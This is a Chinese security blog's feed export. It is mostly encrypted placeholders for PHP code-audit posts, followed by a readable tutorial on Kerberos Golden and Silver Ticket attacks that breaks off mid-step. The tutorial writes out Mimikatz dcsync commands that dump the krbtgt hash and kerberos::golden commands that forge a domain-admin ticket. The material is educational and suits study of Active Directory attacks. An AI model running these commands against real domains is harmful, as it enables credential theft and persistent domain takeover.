c5a5d23c48bae63d7e926b25d9af0ab779e6b9733b4df52148ce562f4993bfaf718d267f0ddc31a9f76692a8edd9b3a765a94e69e2dccfee78c29907bf20bb10d02707190b21f40030fa942614dabfe89f38174a6d5f54d3fcb798eaefa25617641b72cb2e7e65c2e359d580a8dfd0b0da5d420f3ab17e01e63a7509cfd7aedef3c02bb75e060c392d54b7beea33d9433acbc82107a55964de25d70fd75ab181d6568e51f3079bd2ebd63627099dbe553b7f5a51a7711941fb773090acdd22ecb8c9b21cc06c3eec7cc5aa8f0d4a82e97d60a7312f89ae5f2e5353a32a80ba36438184ca7924b2e92b33ca39db39f4106f24a7b3b281ffc5b38b339b6297db1db5813199818b369f0f1ed2f5687776f1371fb8494c8c3f7da07d96191513f44c5e707867b7a2ec49e54758ee3948277e81bd200ed76d1fa11b8aca698ac878b629ad31af8a137024e88e3dd1f658a3d481b733fc0b96f399cb11dc8f9bdfe90c4482bfe73b933582cf1738a022799959e3aacb8078ec24dba112bdec347b209345d891657ce8b54455ae6cb7d30afa132364e2107d589a335a6d4f8819fe8dd8392e9191d3d5ba37f0f3b59721d72606b884d6e51d018b86a5031ecaa8f775f62878e968f972855a179f2368f25385870848a43a5958b3176daceef6bdbf8232e09c6e46913e31178b19d388551d3ed848b1eca910661a1b9dbe4b902325be7cfddae5204538e01ddbe1b46b1124d8c39aac7d1f607a9e3451a5176c663231e3a71cf00742049f2cefc5f38fd235c71b625ba8c070f77c08a8ac879a591b4e77743c0a8df63a06654cc0e11b181ba9f236c8fe3b9699e8f99b9d2983793e38fba1b8619717819c64f19d44bd3d6e65d57eb37dfd981e1842b94db42c3e96b5b3d233e222b7c1c68c772680928380a4f8266bad1d935a4ed0c01f2c0d35e69ff18d41aaa69c885da3f501388e32658dcee9f83abdd0084c7608f953bdc9ab9af74bbf3e8fd9171eac35455fe33b9704fab8f8da97403348e48bc99157b22cf38e2ee8d2f06fd5629ae2be471317a21601c74c81e593661a93d4ae6885a2707767da95bf6a7625d3d7d8cc7b4f2e7092f9da66e0a53a943917398d6dd2d91c59c527157b23100c0284b9d744e68d9bbe591340679a12203233e0799d165efc96d63bf014b3daa3abc31bb4ec87460d24bcd53777581bb86b5a852cfc125c3aa7c371057a2b6e7dcd467698d69330620c9a056e1e13446b5e8f59bcf35ee4ca672973230c197481fdd9d8f680f6a07e0a9f6ba110a1cd0741c932476f26d84eeab31f87003d6f641f459e2e1e31a72779c48cdaae7ce0d03b2eac8e765802ec7663962187c4a7f39cb28c463664c3a49ccafcd8269c812a02e5edeb55a61b39e08333ee5bfec1b5ccc358fcd366ff49e024194bba6cafc6ca6c0866c16ac1470eb6fa986bae4b40da4bb348cfa188c3f0e579c439f4248874a5b40e52023a1d59fdd45d11a3f6b1bea3d84dbcf82dfb075de3af9aa2894235b00ad8f384d64ad3a54c07d2d2ed6facb4c5672779b0790b587dfd1ce98b1220f8037ee2fde766dee7b5280d13fe3028a686dd2d5df028e1eebee96083621220d080253e035137a5b88726fd20a6a3114c138722ce737aee0982c3e71328435b108581424c11a3cd42aa5559b4352da5c412ea5533fb3d07bc2aea5d58f5beb86a9e7c2b66c0a23b3fbdd22a336dfe669278c0533563ca9a3cb878229671f100047dfa0d5d5a67718938b3f64740c3351ec7550b82dc36fa8716a3c6ac160f101f1d996a20e9904e5bbfa8360e15af01e3c7318f2a40c9029f7cab9fcf6070190d289328b3b23dc319fd8873507422a4ad67b40080afca8f3d83a3bffcbb85161b0e4d98a66ffa6cd25630ef4d2d0b5c5577d0b41719c892b1bbb9469d0dd7f4192f14dd99f46d2164706a4d5f2b0d6ac1b0d5a222e740e125ba438ecdd892d19e5c0c0beec880d043c351d5eeaffb2fcf6ab6d117d7ef2c18040de7723821c1baaaccea80034cec17c9786c34f8bd1886157d9bc4034028830d38c9704d5304e56e369aae5731132e15a6bd6d29095e5ada698c8b1aa70abf3de140643bae09ed01000427012139541fe69191364a2e0bf8f02cd8180d4109f5bcf88871ced3ba2c54362ef1d654c8ae79cab8b26287a399771286e7775273bbdaf49198b3ee0d412a4ab8659961bd1e2d3de684383de0857746c86385adab228b7c61ff778fc0cfbeaf801ef837eb968fbf9637387ffc02ec71a163c824bebf35b8fc5c39e81f4dafe8cd76156227cbeecb0335bfbe72e666123576a089c2a1267f0422068323f6c0d85088f21c3c6d3970441e92f737d2326373dcb19f5e04aba82f0ad8e8c1a359b38bffcc910082ea65b54b930bff83eb51f238b5ccb8f1c3557743a268604fa2037e5ffa3ad62ca0c7a0d6c8f38b970204e6175642b1ab94478bbd6de07373d7fd67ea7ee025e8a3e18681887489ff9fc94042f8c2468fe5f5289925f6c2a9a0b781b7a2825fc80d2ae41303e6c394a94f06c41c0a0ef0c972ccf8b18ce39b43538e331bc01504fcb7a6215f6d74281f77272e43b4137bf8dd40788e025c4127da4e2fd3e53ca3387292834193b14ffe69b01caaf3dad5cc2e3850d3e67ed265940a9412b9b662eff9bedcf40e4fb0c0a34673513cacd0c525373eae42001bacf5cdb6ab9955d87738a2d743afa43633edef488094375049aaecbe80a734bb19e54464fb0ba6907213351f5ab97db7f94953798e84a580e98c55d35ff1301d0a322391ab77fff4a64da06da9091b9ff540b7281bb68e671a849e8ccd66bd2326b32aee8d956bbe372f75ee9d4b95136cbaa9f3515b90642f65d39f8936694cc5b9538d821dcb51dcd9f099fc6c1327ae25a04f7ea6661fabcb8e118294c64af0d5f177b64b3090275a83471f0149174489e67f27cfd38606e6f62517737a4ec6647a4e4aad1981a2e6cea5d45a8f8ffe1049b40f0442c3599cdc11f0974c778095ad71c62cabe32a996844591da35dd178b31a23387fea3058c0b49f34e7a56871ebf5fc2e57becd62ac64d0ae496f9b148734df3c47eabfeb00b55d426299f43ef5c2c7449e022f911f14a39e28e6825d92ea546b5c4bf72c8865abb46d325b7a37d9ee5ed325244fb84d7ef0cc8200690ef7b360ca5bfe9fcd16c5d3ff8d41ee09d93a66f30be13b67ad0e6c57aee2450375f8aafea83ca51f6804a0c04c203dc5b2b9fad00d927e052c79316ba24df2dd8a0c714674324573173da2719dd51853aeaf4599a98d48ed0530426653c3e4429251c8640d22bb662a5f5583b84b95ba8c676c4d0a49f2873213d4632aa590c5aa10d4957df5a017cda6dfc44b7a85f6c190e672f0e98827ea4d94b4015ff15ed81acd8a699d5edb6623ffb9ef35dc70c2e5eb3b73542d3610cbda5f79e4d9f0bb6adcd9c94f99ad552e47dd72e298a02581b8547bd1e7743e59ae41b0fea37e7543de3c3bab38ee4bbb34d2fe51696c2e3b82e87372e664cdd3707a833b194da1eb30ac9c819c1b7c5a09bcfc3184eba717c149dd3338649fa3b400d3decf467fd00a97e11c2cfffdcfc93951d5a5bf94c27ee267cd6df381a601f0869498fdfe0cfb2b4eb83e968aefe5a95ce5879d65e518c9b0757deef491e7729be946f8bb9a105c321b3d7b814c61302da5d19d1c6ad6d21f637c83c91803706bb85b7d4957f9a4209445c5ac504100ab2da4f621394919d8cab4deeff14037b42e4f74112789ec4dab37ebafbb5c962e0336e3fbd459b8a55fbe1d69a9ce6a88542ff8e29a0ecddbe585d86b44ca9e083ca7e5a03cb0eb9f857a28ff43e6addd73eba1ae9bc317952e529163bab9cd544991eb9c7c16e18a4f00fb11dc065e424945f760b17554c4d09e89a0605ad3bf1d8f44f2410f7cb3398f71078fd67d268c75605626122db7bc9556152e2bd02758797a1d1e607bcaac2c2886b3dc987390ffe5a7fc09ac6ee129799403c163cbe60eace7dfd844eb39eed69c01849839a78db4e1ac753d72045a14236cb5faeca710b5ca47c284eeaa31a82445b92f5591faff5ac35ba0deb30ff1015901d1575f577a951ce7ccf702ac6f90967d7d4e34ebf4ff10fb6a3f84b38a246ad19a90b0e762c951e96d197c2b43d4905fb5be9930f7212ad04d9a89b331415cb8d9fbf22dc1cf18ba12e83ecf39037bf34f766e2d0cca55e14ee676a5e90f722cea8cbf11a2f82eed1f5eb2bb865bdf4b6ed993be048564be6a9bf5df544036d1256fe30e89d56ae52046434d65933166e4bcb0981332362a2874559685745ee73c4a4d844b36e21fb2391a1fee4f9cb163a3625a17f6c8b440fbdfcc871368e947d7c680683490d3af0d4f5a1c69875f1b62331dafb418c458641c5782d8b279045025764fa06e92182bed75a2b3aa402d08a86a585f2a87c9218ac185b6ba5eeb73fcec4f1d74674f9e55f0920eb496aa7040e6df889b070affcf4957e8593ee3b0a29811211666845f800efc2b9e9afe0443ccfd6093b204abd6fe0634da9bcd3a7c6cb1ac17131bdbe9580c8e7993e66de5a0d339f3c5d285faa9cbc5b94e0514e8817a99f87c538fff484a3501ddb44a33d67e0bb566366121a4d6e2ddd1768f011307dfd26ab26d8355d8409d9f89c9ca9ca2a7c7c3619011516fb4f0b26f29fd6cd5d6e0d5d2f40580a6eb9ad6b906cb7eabfc2e7e01ef15b7155e87e2319552e9edb47ccd6be87877de39412942fb2f403337248a95af02ac42c95b52617560dc808dc58f39e04747a742c9eaf83a023ddff9103eb3b6de889609af82983cf0190da89a58a02a89c0c26d788baa92a0b44944bb804e21afbaec767a6582371923fa84775d34a58041b0c0a2a39432b869d76c7f89e708e4bf48cb47f6e059cd1db3b5bf205ffecf4655e325b5bd3c7d626e42e5fa480f0bda677929755be560c423f6915b886c7541492101781910129a40be9e2428374581cd9193cab36e167a46bc4c2e0039ecea68efb762fa38f136dd0f5868f92f909bcb3fee45acd40094760acdbdcf76505b512793042808ca381909ebe7740048ff4f492bbe5259063ff9eca474fa44bb310355c7e6b9bf0f8dcb260ddfef68a1cf82408a90bbfd93927ab9495ac3abdac1fb872d4df1c0294ffe070f46c9884f4d6d87ba80c50b18fbc0b24597e47eeab2797f85872f8394ad7cd0b6cd2a92ea6c3d4bd00ebf3fd68c30d3c27593a3bb4affc02ca21602651d4671de20aaca8d9e54bbacb77243723be3c037fa8e025dea284c6c6adde554bd2e275a1c33edae4b0fd9ed9205ad73fc6367b904e8039d1231aad8f87c0fca9b8bbe09ab9fd8b10a22ce0a41c3decd65d08687d34b3f22b6240de77c57430b92803b5dc05914488639850fbe8c2e3dce431276d0e436e3fceeeacb804ca8ef718556b2a351de43fcb22183412274fe5a1fb9c7bc267dda6cdf8f529308afb707a836c478003ccfc3411f69fb085e4437d7a8ef96054c57394912070bf45b9d6114947f47c9f3ba04cf2de207079ce7be5193d99dbdd53f9f2d063730d649791420497bce4b762fa355d6332fedd3009a02248b8b39f87e2433fbe19571d2b37dba69c87b56ac42301b00bb47c81c82cb9446a627349726155cca91bf02283113986724288d34f56bb398501532c38c53dca9581ea1f32cc7cd53d947e9378889b38d5280220fc847e8f791f173ce1e7d66e2c5306d38eafb833530306f2850a25bd0e9140eb85df7a0eb22ea016abb3a2f61fa4aa39d0eb4379368ed257fe5015bc20df8315999927ae13c46c02d2a8df4f780480d684bab5882e59dc3826bcbce11242e50988c6e68e0ff7390b5638394fa9845b85f6ffc4928767ec39fbea07b5c4fe802e3787afaa46cc9029c6185f814618a9cea550d1933a4ba218c11aafc8ad0757a1fe78ec14c28e77a9a2c3a0411421b15e3b837e697d6db35d5443edb5bdf8dad548bd796d510efe4c17e14b72831f93d217bbb61c16a83beb9065e43e25bc90992292c57fa41c6b9db6918d39e057f285ef3a45edd9d41c3610094b8ff3f73479dd4dd3beb1ddacb94bf0041ac86d3527b308f12da166ed6298b78c67feb59582e2d78aa55b7e1f869eee6b5511aff38ce5e3387955a45b33064cc5d88f1d3f48dbef07adf9cad8bf630fdafee2371798b532d74aed652b644ac</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="php代码审计学习" scheme="https://shu1l.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Jizhicms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:22.000Z</published>
    <updated>2021-04-02T11:19:51.056Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="91270d06592d4284604580f4a44befa04332c411925c8bb938910048897a7453">fe040a29e7dd22b4e0f1dcc4236675aa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="php代码审计学习" scheme="https://shu1l.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>188jianzhan SQL注入漏洞代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:51:43.000Z</published>
    <updated>2020-11-25T08:55:53.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5e9a99c637a5dd944a8dab441966c23806a2e8b08e466a190627f6804b2e0cf0">7f72502a417ec5d3e785d86e3c7240c8543f7b25d0690aae79fb85f4d15385ed5fe309ca0c297fa3a8bd8b1c1223a70cb8d7c64368057cf60f41349d86aacf6736aa015fe04cd35b0be3b81d6879aa6af3932a4a4a0af2ead4ff451de8c40a66a6a3c0e20481256d236700b6b4e5e0b75a4e0153cc0d7f0ab4b2142af76bb3484cb2aa0ef593628e4cb2539e33b02f2b7e28ec238225057d409994c89f81c70c809fe6e6fda49f90793ed92e355747994b96ef7aa2bd43e39a9aff0946117a97f70831c6adb74ccd555ddad2582ee8ee3b4793bee45fd3881ee36d20de2056105b681baf7be433e014d5529d6bce2f188fe4d8db1dbcc3a1247f8fa12898bdc36dc288713350f9c219226dd9b8ab89dede423e0b7f8382539b562d3a5f042b2b41efe9c01ca835e3be2edaf8de8981ccaf044e755da144c95e6d7fe9f79a1886f789195846e0669b886101ba0d093dcfb99efa49fa78b62d02e5d9ea40425674c97f08dec2d7d025d151f56d41f33016305016203fc5501baeae86291a1c640d3f4a603b253b47a75f71bad9ef16ebcfa244674714f5fb5fa7a2952b0788bb4814153859a32508e4e72592c157df8161687ba2b37320c68639491aab6a94731fe22dc8cd1207304f55fb9d0a33391ece934551b08665795b91c3ee80cb6a22eec57d576873edd07336bd6c0a2206091940cac64dfa7799d40c1422fadc2c4c11fb2fcb317d07f11da2c53a670b4ca59ef367e4253435e2b6be841f52b8bc082518dda10dd5bae54e416d4bb3c867bf8afef34e4ec5a1571a7b476f8880a8d46a7f0028c9c481c0609f050018423b1f43d82b381246466de91a251b0cd9ba0ba3844573c789a37ec5701aabcec0fc8018c9507fccbf6a0c5d7ea4104410c74ca1d782ccb1c7f8280a6289160f97e954bea95e0f47e85d752b41df906df42edee3c4a9628a154b5f6c134e14352e4292a7495a187bcde3538c940b3db661ee08b2832edd7df25e4b21cefaffce3bd4c903e7c70dfcc107257a99cf1ed1427cb24dabc96be3013c47fd1118a593cdda5abbd0352faa47fd9cbf349d42b0b2423cead0fbdd8d0e4893376b3a81ba31c0e577b8d8cd5020df9aced6812ee2943f6100afee160a676bfb8cfc7c093f05442ad3d4f0200582f37d8c0d9954ae8c64074e01ebdd5e030e02836c3b2aedee69502cc3566c480caf1bb50cd137d891ece487a670bc3e4634ff41999ded90cf76787dbe5c2bd2dc002107d003a1dd579f385ef35befe98a8c0508758c48c33f51ed4474813dfc5da10e43a9140ad3e2e53748c3c4a5541d08f47d531743a8a2ebe56458000a1709e56d140e5ca1006dc1fc4a82b5329a3d2a1875f5b1e36041ed764e4133724b89713c26b9645f34a411bf1dd132f80d870bf117ffdacf94493c419bdd00120aed497c87112197c6138e2fadc5bc4d71fe05e854ecb91e18ecfc9d932c80f0517c13f95a1a73cda03157f30ae1d85ce8c0a38631f027cd71aaee1852b8c64e4425fbe7b36233ff78adbe91c44046bef2350175a34c2fd8b96cf6223d62c7df43e653a40650393905b4e7fa0fab5f2f2b064985d8c48c9e502a1346836ddce4df143039e3bf7d639b2596ca46349b8bd7d66ffc4ea9c627e57dea84ac5acd9d4cfe1aaef9ed44052b72207e5bde3f6a3e21b69e0d5711deaa1f5f0084923d337e6a3942948373ef3ee663a85d95930b7804a794caa91a8c4b5c739bd2753ca3aeefc63e03a11918553acddd527153824210b5fbfcf8c6735bb0005ec33a4979dfce3c2c70c5fff4261754310d531825ff5f66e5cae20698b942fbcbc0afd9ea03359ce5efa8d5d8fd10ae087097ddecba39637bea91c52b0c51c926d91937625b56d6732fc79de8f26029ec929935925801418244eb0e5d8ea03c2ebbaacd59fc8523fca21a7127c5a585fcf27b3b2acf5fdf6ca7d16cdfe8821796f00b447a110ccb381bbab6738d3e2209201138901b06f906bb14f08e596892569ba34da35264aceb3f8af602d39d4148ca3f1be99cc9eab095794ffdbe6cc311ac1b35741e7fbb559133f55d37c60640b805cca764448ba7e1998b44d02fbf55860db7ac3cc22842a956a65735bb610ce5336c4fb0ebc10863fe2df19e5b255574f7018aaabf510655339d8d28ab41c2d44f83f44516a53a3ded03c3f6ae37baab9073fbed998f641c260b4438616040b0c486262775ef163d499cd6d958c24c753a77b9cc9c84cdcc1764b1ce2a4c63eb4b6478816e92b04d067554a50f5687a170d921de58149d141787b99e13a32aabb2ae30dd8298517f17fde540f10b5705c2ef8234a5c67019c4b2aa74c148b8a4f4bae84e865bf5b9d37fc4e9cb054d02becc074b51928afb69086364a9e545ce51766c08357a1c5863e984b0bdb351affec69f30867e69f0067b81df295aaf73bced5aa02abc45ccef90720d9a03014641b5ef6695afcce1f2e3fb09395efab198845e132d04ef9a1254f41b7fab963fe57613c4af73c067c60d4b3e763819998855352e00d76e413e4462f6fb8a36654d50342a428007f4985bbc796095e6dbdd4673bdadffb572fe42314ba42d35b6b0e29e89494458f5e36c3e20760da233ee6a041ed3636fede7d18947d8ec23c5a2a04f57b4a6e35e68612350011423b822200ea301d124676f9f68d80a4cf5af437eefa89516fca0931519c8a5b2cff6968f2589ff7a3856797693a9cd6b8d8c74118ec315e1a2ea110145b2c46c54ced2c3569ca05473516db7d628cf6263dcea5570af3deee40d22bdad8915eee98fe644cea3c3e405a4c2a0bde5db526c8471dbcd54f84a946b58e9f9c0f573abdb081a6cfe14d02dedb099f4f6f6943df73a557d59928c41c7caa018ca353ced80433d9b38f7023dbf6f522f3559da1e6f45695a60e5241af55ebec73ed816e187a4807269e9074293e6d4201624e1daa6243a84325383475ee7f36dc0db328871db8fc9b26b526129f35fb50598bbf6c9b044969838587d959756ae7c0e009353382880282d6b1b7c7d0f5884ee725980b23dc866815d6f810ac80b8395986cbcabbb18ae3b1bbde26c892c7ef15c6077236f56ee4fb7b15e31de2445324d5310f47b21f4805e9776e09817934eb0bc51569407eaf9b3d9b4fc98980c6566a5436f866225c18f5ba6009e2fe2d7bdbec923800b729f325e9f313faf7933814afec1525cf580e1a1879a76dc2f8dbe3da99427837903361a7427ad3382004e9d40c19b6667445463109f68dce8408dd02c40df5b5bb8642375f514a2e94aee0330a577c219befe4db32866cb9fa3373a26bc3a165233ee044eb9e0b96f343d0594c29bf71f292f0d46b3d198bc01a60f533477381f1fbd36f73a4f092d28f341c1c1a698e3cfb2426cbac53a4fea5e5098100a5b3b030a2e14abb522a81d425f7acc4dbdf706df23d696990f0c1b100527458222ab6ed4052f72f73db42143c818f47001c4b960be281bb19c712b4370b1b9662811490031df512ed2fa7323b1f98dded05b4d784f4fc7a64ece17a416d07d47e91f39c1905b5f834702bc2e12c16840e5cda43b2ca181add8abfb00c0ceddb526474a7af0e9a15865deda23d6f41e64e5e84de15d84988fc150e2c6d0f372c33339f3758bf61fb03b8ab79134edce437d43025029edcf52fd6590ceff7478821b1813fd04f8c96aea8870a28c98fa03a4c68300024c84af6d0041e966ea9320e8c2e695c290c3efbd59d093700cfe0bd8bb2c8ab179fb2fbbc59984ae269ff09646548c07457c7d7d2599d6aa1077cde1d4b4c1193f3adc51780ee803ee924b90965cf8ee86d3d7def32aafb49094410f001a0efbe632e811f18195515d76da7e2fb13ade723ee83c9f6e253578b19df222e6db35384899950946501d07fe9ca09c2e8bc5d7c571fb2f35c6aeb0115ea3235c26892445b2601aaf70f6bfe3b6ce444263c5f40f6b92b678aafcd64cc9d043fd1ce173a6a1836da8591a102602af6854be02c3eb0ccea507d7ec0743b6dfa13cfb1381e0d6a5b555eb4b7dbbe9b0e484ae623bf5b2adb117b0fbc4a157304717f7d781e19e4700735fd7464a70edf0f85038e64a85f5ba10afa7a5843f5d4fa8edc8429eefcc587c45db34e838c6445bb6f5f4e10f550b3ebd4657</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="php代码审计学习" scheme="https://shu1l.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="php代码审计" scheme="https://shu1l.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅析黄金票据与白银票据</title>
    <link href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/"/>
    <id>https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</id>
    <published>2020-06-06T00:31:56.000Z</published>
    <updated>2020-11-25T12:10:49.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li></ul><h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p><p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p><p><img src="2016011804523676070160.png" alt="Alt text"></p><h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul><li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li><li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li><li>该<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li><li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li><li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451" target="_blank" rel="noopener">通常从域控制器转储</a>）。</li><li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li><li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li><li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li></ul><h5 id="制作金票的条件："><a href="#制作金票的条件：" class="headerlink" title="制作金票的条件："></a>制作金票的条件：</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称            </span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账户密码HASH</span><br><span class="line"><span class="number">4</span>、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><p>实战中，通常使用Mimikatz来提取krbtgt的NTLM-Hash。</p><p>1.获取域名称</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">view</span> /<span class="built_in">domain</span></span><br></pre></td></tr></table></figure><p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /domain:test666.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure><p>3..Mimikatz生成黄金票据</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test666.com /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1497092113</span><span class="string">-2272191533</span><span class="string">-193330055</span> /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"</span><br></pre></td></tr></table></figure><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤:"></a>利用步骤:</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure><p>命令获取krbtgt的值。</p><p><img src="1566542295163.png" alt=""></p><h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 